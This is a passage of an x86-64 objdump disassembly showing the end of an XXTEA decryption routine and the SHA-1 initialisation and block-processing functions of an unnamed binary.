  402fe4:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  402fe8:	48 01 f8             	add    %rdi,%rax
  402feb:	8b 00                	mov    (%rax),%eax
  402fed:	33 45 fc             	xor    -0x4(%rbp),%eax
  402ff0:	01 c8                	add    %ecx,%eax
  402ff2:	31 f0                	xor    %esi,%eax
  402ff4:	29 c2                	sub    %eax,%edx
  402ff6:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402ffa:	89 10                	mov    %edx,(%rax)
  402ffc:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  403000:	8b 00                	mov    (%rax),%eax
  403002:	89 45 ec             	mov    %eax,-0x14(%rbp)
  403005:	81 45 e8 47 86 c8 61 	addl   $0x61c88647,-0x18(%rbp)
  40300c:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
  403010:	0f 85 ae fe ff ff    	jne    402ec4 <XXTEA_Decrypt+0x39>
  403016:	5d                   	pop    %rbp
  403017:	c3                   	retq   

0000000000403018 <sha1_starts>:
  403018:	55                   	push   %rbp
  403019:	48 89 e5             	mov    %rsp,%rbp
  40301c:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
  403020:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403024:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  40302b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40302f:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
  403036:	00 
  403037:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40303b:	48 c7 40 10 01 23 45 	movq   $0x67452301,0x10(%rax)
  403042:	67 
  403043:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403047:	ba 89 ab cd ef       	mov    $0xefcdab89,%edx
  40304c:	48 89 50 18          	mov    %rdx,0x18(%rax)
  403050:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403054:	b9 fe dc ba 98       	mov    $0x98badcfe,%ecx
  403059:	48 89 48 20          	mov    %rcx,0x20(%rax)
  40305d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403061:	48 c7 40 28 76 54 32 	movq   $0x10325476,0x28(%rax)
  403068:	10 
  403069:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40306d:	be f0 e1 d2 c3       	mov    $0xc3d2e1f0,%esi
  403072:	48 89 70 30          	mov    %rsi,0x30(%rax)
  403076:	5d                   	pop    %rbp
  403077:	c3                   	retq   

0000000000403078 <sha1_process>:
  403078:	55                   	push   %rbp
  403079:	48 89 e5             	mov    %rsp,%rbp
  40307c:	48 83 ec 48          	sub    $0x48,%rsp
  403080:	48 89 bd 48 ff ff ff 	mov    %rdi,-0xb8(%rbp)
  403087:	48 89 b5 40 ff ff ff 	mov    %rsi,-0xc0(%rbp)
  40308e:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403095:	0f b6 00             	movzbl (%rax),%eax
  403098:	0f b6 c0             	movzbl %al,%eax
  40309b:	48 c1 e0 18          	shl    $0x18,%rax
  40309f:	48 89 c2             	mov    %rax,%rdx
  4030a2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4030a9:	48 83 c0 01          	add    $0x1,%rax
  4030ad:	0f b6 00             	movzbl (%rax),%eax
  4030b0:	0f b6 c0             	movzbl %al,%eax
  4030b3:	48 c1 e0 10          	shl    $0x10,%rax
  4030b7:	48 09 c2             	or     %rax,%rdx
  4030ba:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4030c1:	48 83 c0 02          	add    $0x2,%rax
  4030c5:	0f b6 00             	movzbl (%rax),%eax
  4030c8:	0f b6 c0             	movzbl %al,%eax
  4030cb:	48 c1 e0 08          	shl    $0x8,%rax
  4030cf:	48 09 c2             	or     %rax,%rdx
  4030d2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4030d9:	48 83 c0 03          	add    $0x3,%rax
  4030dd:	0f b6 00             	movzbl (%rax),%eax
  4030e0:	0f b6 c0             	movzbl %al,%eax
  4030e3:	48 09 d0             	or     %rdx,%rax
  4030e6:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  4030ea:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4030f1:	48 83 c0 04          	add    $0x4,%rax
  4030f5:	0f b6 00             	movzbl (%rax),%eax
  4030f8:	0f b6 c0             	movzbl %al,%eax
  4030fb:	48 c1 e0 18          	shl    $0x18,%rax
  4030ff:	48 89 c2             	mov    %rax,%rdx
  403102:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403109:	48 83 c0 05          	add    $0x5,%rax
  40310d:	0f b6 00             	movzbl (%rax),%eax
  403110:	0f b6 c0             	movzbl %al,%eax
  403113:	48 c1 e0 10          	shl    $0x10,%rax
  403117:	48 09 c2             	or     %rax,%rdx
  40311a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403121:	48 83 c0 06          	add    $0x6,%rax
  403125:	0f b6 00             	movzbl (%rax),%eax
  403128:	0f b6 c0             	movzbl %al,%eax
  40312b:	48 c1 e0 08          	shl    $0x8,%rax
  40312f:	48 09 c2             	or     %rax,%rdx
  403132:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403139:	48 83 c0 07          	add    $0x7,%rax
  40313d:	0f b6 00             	movzbl (%rax),%eax
  403140:	0f b6 c0             	movzbl %al,%eax
  403143:	48 09 d0             	or     %rdx,%rax
  403146:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  40314a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403151:	48 83 c0 08          	add    $0x8,%rax
  403155:	0f b6 00             	movzbl (%rax),%eax
  403158:	0f b6 c0             	movzbl %al,%eax
  40315b:	48 c1 e0 18          	shl    $0x18,%rax
  40315f:	48 89 c2             	mov    %rax,%rdx
  403162:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403169:	48 83 c0 09          	add    $0x9,%rax
  40316d:	0f b6 00             	movzbl (%rax),%eax
  403170:	0f b6 c0             	movzbl %al,%eax
  403173:	48 c1 e0 10          	shl    $0x10,%rax
  403177:	48 09 c2             	or     %rax,%rdx
  40317a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403181:	48 83 c0 0a          	add    $0xa,%rax
  403185:	0f b6 00             	movzbl (%rax),%eax
  403188:	0f b6 c0             	movzbl %al,%eax
  40318b:	48 c1 e0 08          	shl    $0x8,%rax
  40318f:	48 09 c2             	or     %rax,%rdx
  403192:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403199:	48 83 c0 0b          	add    $0xb,%rax
  40319d:	0f b6 00             	movzbl (%rax),%eax
  4031a0:	0f b6 c0             	movzbl %al,%eax
  4031a3:	48 09 d0             	or     %rdx,%rax
  4031a6:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  4031aa:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4031b1:	48 83 c0 0c          	add    $0xc,%rax
  4031b5:	0f b6 00             	movzbl (%rax),%eax
  4031b8:	0f b6 c0             	movzbl %al,%eax
  4031bb:	48 c1 e0 18          	shl    $0x18,%rax
  4031bf:	48 89 c2             	mov    %rax,%rdx
  4031c2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4031c9:	48 83 c0 0d          	add    $0xd,%rax
  4031cd:	0f b6 00             	movzbl (%rax),%eax
  4031d0:	0f b6 c0             	movzbl %al,%eax
  4031d3:	48 c1 e0 10          	shl    $0x10,%rax
  4031d7:	48 09 c2             	or     %rax,%rdx
  4031da:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4031e1:	48 83 c0 0e          	add    $0xe,%rax
  4031e5:	0f b6 00             	movzbl (%rax),%eax
  4031e8:	0f b6 c0             	movzbl %al,%eax
  4031eb:	48 c1 e0 08          	shl    $0x8,%rax
  4031ef:	48 09 c2             	or     %rax,%rdx
  4031f2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4031f9:	48 83 c0 0f          	add    $0xf,%rax
  4031fd:	0f b6 00             	movzbl (%rax),%eax
  403200:	0f b6 c0             	movzbl %al,%eax
  403203:	48 09 d0             	or     %rdx,%rax
  403206:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  40320a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403211:	48 83 c0 10          	add    $0x10,%rax
  403215:	0f b6 00             	movzbl (%rax),%eax
  403218:	0f b6 c0             	movzbl %al,%eax
  40321b:	48 c1 e0 18          	shl    $0x18,%rax
  40321f:	48 89 c2             	mov    %rax,%rdx
  403222:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403229:	48 83 c0 11          	add    $0x11,%rax
  40322d:	0f b6 00             	movzbl (%rax),%eax
  403230:	0f b6 c0             	movzbl %al,%eax
  403233:	48 c1 e0 10          	shl    $0x10,%rax
  403237:	48 09 c2             	or     %rax,%rdx
  40323a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403241:	48 83 c0 12          	add    $0x12,%rax
  403245:	0f b6 00             	movzbl (%rax),%eax
  403248:	0f b6 c0             	movzbl %al,%eax
  40324b:	48 c1 e0 08          	shl    $0x8,%rax
  40324f:	48 09 c2             	or     %rax,%rdx
  403252:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403259:	48 83 c0 13          	add    $0x13,%rax
  40325d:	0f b6 00             	movzbl (%rax),%eax
  403260:	0f b6 c0             	movzbl %al,%eax
  403263:	48 09 d0             	or     %rdx,%rax
  403266:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  40326a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403271:	48 83 c0 14          	add    $0x14,%rax
  403275:	0f b6 00             	movzbl (%rax),%eax
  403278:	0f b6 c0             	movzbl %al,%eax
  40327b:	48 c1 e0 18          	shl    $0x18,%rax
  40327f:	48 89 c2             	mov    %rax,%rdx
  403282:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403289:	48 83 c0 15          	add    $0x15,%rax
  40328d:	0f b6 00             	movzbl (%rax),%eax
  403290:	0f b6 c0             	movzbl %al,%eax
  403293:	48 c1 e0 10          	shl    $0x10,%rax
  403297:	48 09 c2             	or     %rax,%rdx
  40329a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4032a1:	48 83 c0 16          	add    $0x16,%rax
  4032a5:	0f b6 00             	movzbl (%rax),%eax
  4032a8:	0f b6 c0             	movzbl %al,%eax
  4032ab:	48 c1 e0 08          	shl    $0x8,%rax
  4032af:	48 09 c2             	or     %rax,%rdx
  4032b2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4032b9:	48 83 c0 17          	add    $0x17,%rax
  4032bd:	0f b6 00             	movzbl (%rax),%eax
  4032c0:	0f b6 c0             	movzbl %al,%eax
  4032c3:	48 09 d0             	or     %rdx,%rax
  4032c6:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  4032ca:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4032d1:	48 83 c0 18          	add    $0x18,%rax
  4032d5:	0f b6 00             	movzbl (%rax),%eax
  4032d8:	0f b6 c0             	movzbl %al,%eax
  4032db:	48 c1 e0 18          	shl    $0x18,%rax
  4032df:	48 89 c2             	mov    %rax,%rdx
  4032e2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4032e9:	48 83 c0 19          	add    $0x19,%rax
  4032ed:	0f b6 00             	movzbl (%rax),%eax
  4032f0:	0f b6 c0             	movzbl %al,%eax
  4032f3:	48 c1 e0 10          	shl    $0x10,%rax
  4032f7:	48 09 c2             	or     %rax,%rdx
  4032fa:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403301:	48 83 c0 1a          	add    $0x1a,%rax
  403305:	0f b6 00             	movzbl (%rax),%eax
  403308:	0f b6 c0             	movzbl %al,%eax
  40330b:	48 c1 e0 08          	shl    $0x8,%rax
  40330f:	48 09 c2             	or     %rax,%rdx
  403312:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403319:	48 83 c0 1b          	add    $0x1b,%rax
  40331d:	0f b6 00             	movzbl (%rax),%eax
  403320:	0f b6 c0             	movzbl %al,%eax
  403323:	48 09 d0             	or     %rdx,%rax
  403326:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  40332a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403331:	48 83 c0 1c          	add    $0x1c,%rax
  403335:	0f b6 00             	movzbl (%rax),%eax
  403338:	0f b6 c0             	movzbl %al,%eax
  40333b:	48 c1 e0 18          	shl    $0x18,%rax
  40333f:	48 89 c2             	mov    %rax,%rdx
  403342:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403349:	48 83 c0 1d          	add    $0x1d,%rax
  40334d:	0f b6 00             	movzbl (%rax),%eax
  403350:	0f b6 c0             	movzbl %al,%eax
  403353:	48 c1 e0 10          	shl    $0x10,%rax
  403357:	48 09 c2             	or     %rax,%rdx
  40335a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403361:	48 83 c0 1e          	add    $0x1e,%rax
  403365:	0f b6 00             	movzbl (%rax),%eax
  403368:	0f b6 c0             	movzbl %al,%eax
  40336b:	48 c1 e0 08          	shl    $0x8,%rax
  40336f:	48 09 c2             	or     %rax,%rdx
  403372:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403379:	48 83 c0 1f          	add    $0x1f,%rax
  40337d:	0f b6 00             	movzbl (%rax),%eax
  403380:	0f b6 c0             	movzbl %al,%eax
  403383:	48 09 d0             	or     %rdx,%rax
  403386:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  40338a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403391:	48 83 c0 20          	add    $0x20,%rax
  403395:	0f b6 00             	movzbl (%rax),%eax
  403398:	0f b6 c0             	movzbl %al,%eax
  40339b:	48 c1 e0 18          	shl    $0x18,%rax
  40339f:	48 89 c2             	mov    %rax,%rdx
  4033a2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4033a9:	48 83 c0 21          	add    $0x21,%rax
  4033ad:	0f b6 00             	movzbl (%rax),%eax
  4033b0:	0f b6 c0             	movzbl %al,%eax
  4033b3:	48 c1 e0 10          	shl    $0x10,%rax
  4033b7:	48 09 c2             	or     %rax,%rdx
  4033ba:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4033c1:	48 83 c0 22          	add    $0x22,%rax
  4033c5:	0f b6 00             	movzbl (%rax),%eax
  4033c8:	0f b6 c0             	movzbl %al,%eax
  4033cb:	48 c1 e0 08          	shl    $0x8,%rax
  4033cf:	48 09 c2             	or     %rax,%rdx
  4033d2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4033d9:	48 83 c0 23          	add    $0x23,%rax
  4033dd:	0f b6 00             	movzbl (%rax),%eax
  4033e0:	0f b6 c0             	movzbl %al,%eax
  4033e3:	48 09 d0             	or     %rdx,%rax
  4033e6:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  4033ea:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4033f1:	48 83 c0 24          	add    $0x24,%rax
  4033f5:	0f b6 00             	movzbl (%rax),%eax
  4033f8:	0f b6 c0             	movzbl %al,%eax
  4033fb:	48 c1 e0 18          	shl    $0x18,%rax
  4033ff:	48 89 c2             	mov    %rax,%rdx
  403402:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403409:	48 83 c0 25          	add    $0x25,%rax
  40340d:	0f b6 00             	movzbl (%rax),%eax
  403410:	0f b6 c0             	movzbl %al,%eax
  403413:	48 c1 e0 10          	shl    $0x10,%rax
  403417:	48 09 c2             	or     %rax,%rdx
  40341a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403421:	48 83 c0 26          	add    $0x26,%rax
  403425:	0f b6 00             	movzbl (%rax),%eax
  403428:	0f b6 c0             	movzbl %al,%eax
  40342b:	48 c1 e0 08          	shl    $0x8,%rax
  40342f:	48 09 c2             	or     %rax,%rdx
  403432:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403439:	48 83 c0 27          	add    $0x27,%rax
  40343d:	0f b6 00             	movzbl (%rax),%eax
  403440:	0f b6 c0             	movzbl %al,%eax
  403443:	48 09 d0             	or     %rdx,%rax
  403446:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  40344a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403451:	48 83 c0 28          	add    $0x28,%rax
  403455:	0f b6 00             	movzbl (%rax),%eax
  403458:	0f b6 c0             	movzbl %al,%eax
  40345b:	48 c1 e0 18          	shl    $0x18,%rax
  40345f:	48 89 c2             	mov    %rax,%rdx
  403462:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403469:	48 83 c0 29          	add    $0x29,%rax
  40346d:	0f b6 00             	movzbl (%rax),%eax
  403470:	0f b6 c0             	movzbl %al,%eax
  403473:	48 c1 e0 10          	shl    $0x10,%rax
  403477:	48 09 c2             	or     %rax,%rdx
  40347a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403481:	48 83 c0 2a          	add    $0x2a,%rax
  403485:	0f b6 00             	movzbl (%rax),%eax
  403488:	0f b6 c0             	movzbl %al,%eax
  40348b:	48 c1 e0 08          	shl    $0x8,%rax
  40348f:	48 09 c2             	or     %rax,%rdx
  403492:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403499:	48 83 c0 2b          	add    $0x2b,%rax
  40349d:	0f b6 00             	movzbl (%rax),%eax
  4034a0:	0f b6 c0             	movzbl %al,%eax
  4034a3:	48 09 d0             	or     %rdx,%rax
  4034a6:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  4034aa:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4034b1:	48 83 c0 2c          	add    $0x2c,%rax
  4034b5:	0f b6 00             	movzbl (%rax),%eax
  4034b8:	0f b6 c0             	movzbl %al,%eax
  4034bb:	48 c1 e0 18          	shl    $0x18,%rax
  4034bf:	48 89 c2             	mov    %rax,%rdx
  4034c2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4034c9:	48 83 c0 2d          	add    $0x2d,%rax
  4034cd:	0f b6 00             	movzbl (%rax),%eax
  4034d0:	0f b6 c0             	movzbl %al,%eax
  4034d3:	48 c1 e0 10          	shl    $0x10,%rax
  4034d7:	48 09 c2             	or     %rax,%rdx
  4034da:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4034e1:	48 83 c0 2e          	add    $0x2e,%rax
  4034e5:	0f b6 00             	movzbl (%rax),%eax
  4034e8:	0f b6 c0             	movzbl %al,%eax
  4034eb:	48 c1 e0 08          	shl    $0x8,%rax
  4034ef:	48 09 c2             	or     %rax,%rdx
  4034f2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4034f9:	48 83 c0 2f          	add    $0x2f,%rax
  4034fd:	0f b6 00             	movzbl (%rax),%eax
  403500:	0f b6 c0             	movzbl %al,%eax
  403503:	48 09 d0             	or     %rdx,%rax
  403506:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  40350a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403511:	48 83 c0 30          	add    $0x30,%rax
  403515:	0f b6 00             	movzbl (%rax),%eax
  403518:	0f b6 c0             	movzbl %al,%eax
  40351b:	48 c1 e0 18          	shl    $0x18,%rax
  40351f:	48 89 c2             	mov    %rax,%rdx
  403522:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403529:	48 83 c0 31          	add    $0x31,%rax
  40352d:	0f b6 00             	movzbl (%rax),%eax
  403530:	0f b6 c0             	movzbl %al,%eax
  403533:	48 c1 e0 10          	shl    $0x10,%rax
  403537:	48 09 c2             	or     %rax,%rdx
  40353a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403541:	48 83 c0 32          	add    $0x32,%rax
  403545:	0f b6 00             	movzbl (%rax),%eax
  403548:	0f b6 c0             	movzbl %al,%eax
  40354b:	48 c1 e0 08          	shl    $0x8,%rax
  40354f:	48 09 c2             	or     %rax,%rdx
  403552:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403559:	48 83 c0 33          	add    $0x33,%rax
  40355d:	0f b6 00             	movzbl (%rax),%eax
  403560:	0f b6 c0             	movzbl %al,%eax
  403563:	48 09 d0             	or     %rdx,%rax
  403566:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  40356a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403571:	48 83 c0 34          	add    $0x34,%rax
  403575:	0f b6 00             	movzbl (%rax),%eax
  403578:	0f b6 c0             	movzbl %al,%eax
  40357b:	48 c1 e0 18          	shl    $0x18,%rax
  40357f:	48 89 c2             	mov    %rax,%rdx
  403582:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403589:	48 83 c0 35          	add    $0x35,%rax
  40358d:	0f b6 00             	movzbl (%rax),%eax
  403590:	0f b6 c0             	movzbl %al,%eax
  403593:	48 c1 e0 10          	shl    $0x10,%rax
  403597:	48 09 c2             	or     %rax,%rdx
  40359a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4035a1:	48 83 c0 36          	add    $0x36,%rax
  4035a5:	0f b6 00             	movzbl (%rax),%eax
  4035a8:	0f b6 c0             	movzbl %al,%eax
  4035ab:	48 c1 e0 08          	shl    $0x8,%rax
  4035af:	48 09 c2             	or     %rax,%rdx
  4035b2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4035b9:	48 83 c0 37          	add    $0x37,%rax
  4035bd:	0f b6 00             	movzbl (%rax),%eax
  4035c0:	0f b6 c0             	movzbl %al,%eax
  4035c3:	48 09 d0             	or     %rdx,%rax
  4035c6:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4035ca:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4035d1:	48 83 c0 38          	add    $0x38,%rax
  4035d5:	0f b6 00             	movzbl (%rax),%eax
  4035d8:	0f b6 c0             	movzbl %al,%eax
  4035db:	48 c1 e0 18          	shl    $0x18,%rax
  4035df:	48 89 c2             	mov    %rax,%rdx
  4035e2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4035e9:	48 83 c0 39          	add    $0x39,%rax
  4035ed:	0f b6 00             	movzbl (%rax),%eax
  4035f0:	0f b6 c0             	movzbl %al,%eax
  4035f3:	48 c1 e0 10          	shl    $0x10,%rax
  4035f7:	48 09 c2             	or     %rax,%rdx
  4035fa:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403601:	48 83 c0 3a          	add    $0x3a,%rax
  403605:	0f b6 00             	movzbl (%rax),%eax
  403608:	0f b6 c0             	movzbl %al,%eax
  40360b:	48 c1 e0 08          	shl    $0x8,%rax
  40360f:	48 09 c2             	or     %rax,%rdx
  403612:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403619:	48 83 c0 3b          	add    $0x3b,%rax
  40361d:	0f b6 00             	movzbl (%rax),%eax
  403620:	0f b6 c0             	movzbl %al,%eax
  403623:	48 09 d0             	or     %rdx,%rax
  403626:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  40362a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403631:	48 83 c0 3c          	add    $0x3c,%rax
  403635:	0f b6 00             	movzbl (%rax),%eax
  403638:	0f b6 c0             	movzbl %al,%eax
  40363b:	48 c1 e0 18          	shl    $0x18,%rax
  40363f:	48 89 c2             	mov    %rax,%rdx
  403642:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403649:	48 83 c0 3d          	add    $0x3d,%rax
  40364d:	0f b6 00             	movzbl (%rax),%eax
  403650:	0f b6 c0             	movzbl %al,%eax
  403653:	48 c1 e0 10          	shl    $0x10,%rax
  403657:	48 09 c2             	or     %rax,%rdx
  40365a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403661:	48 83 c0 3e          	add    $0x3e,%rax
  403665:	0f b6 00             	movzbl (%rax),%eax
  403668:	0f b6 c0             	movzbl %al,%eax
  40366b:	48 c1 e0 08          	shl    $0x8,%rax
  40366f:	48 09 c2             	or     %rax,%rdx
  403672:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403679:	48 83 c0 3f          	add    $0x3f,%rax
  40367d:	0f b6 00             	movzbl (%rax),%eax
  403680:	0f b6 c0             	movzbl %al,%eax
  403683:	48 09 d0             	or     %rdx,%rax
  403686:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  40368a:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  403691:	48 8b 40 10          	mov    0x10(%rax),%rax
  403695:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  40369c:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  4036a3:	48 8b 40 18          	mov    0x18(%rax),%rax
  4036a7:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  4036ae:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  4036b5:	48 8b 40 20          	mov    0x20(%rax),%rax
  4036b9:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4036c0:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  4036c7:	48 8b 40 28          	mov    0x28(%rax),%rax
  4036cb:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4036d2:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  4036d9:	48 8b 40 30          	mov    0x30(%rax),%rax
  4036dd:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4036e4:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4036eb:	48 c1 e0 05          	shl    $0x5,%rax
  4036ef:	48 89 c2             	mov    %rax,%rdx
  4036f2:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4036f9:	89 c0                	mov    %eax,%eax
  4036fb:	48 c1 e8 1b          	shr    $0x1b,%rax
  4036ff:	48 89 d1             	mov    %rdx,%rcx
  403702:	48 09 c1             	or     %rax,%rcx
  403705:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40370c:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  403713:	48 31 d0             	xor    %rdx,%rax
  403716:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  40371d:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  403724:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403728:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  40372c:	48 01 c2             	add    %rax,%rdx
  40372f:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403736:	48 01 d0             	add    %rdx,%rax
  403739:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  40373f:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  403746:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40374d:	48 c1 e0 1e          	shl    $0x1e,%rax
  403751:	48 89 c2             	mov    %rax,%rdx
  403754:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40375b:	89 c0                	mov    %eax,%eax
  40375d:	48 c1 e8 02          	shr    $0x2,%rax
  403761:	48 09 d0             	or     %rdx,%rax
  403764:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  40376b:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403772:	48 c1 e0 05          	shl    $0x5,%rax
  403776:	48 89 c2             	mov    %rax,%rdx
  403779:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403780:	89 c0                	mov    %eax,%eax
  403782:	48 c1 e8 1b          	shr    $0x1b,%rax
  403786:	48 89 d1             	mov    %rdx,%rcx
  403789:	48 09 c1             	or     %rax,%rcx
  40378c:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403793:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  40379a:	48 31 d0             	xor    %rdx,%rax
  40379d:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  4037a4:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  4037ab:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4037af:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  4037b3:	48 01 c2             	add    %rax,%rdx
  4037b6:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4037bd:	48 01 d0             	add    %rdx,%rax
  4037c0:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  4037c6:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4037cd:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4037d4:	48 c1 e0 1e          	shl    $0x1e,%rax
  4037d8:	48 89 c2             	mov    %rax,%rdx
  4037db:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
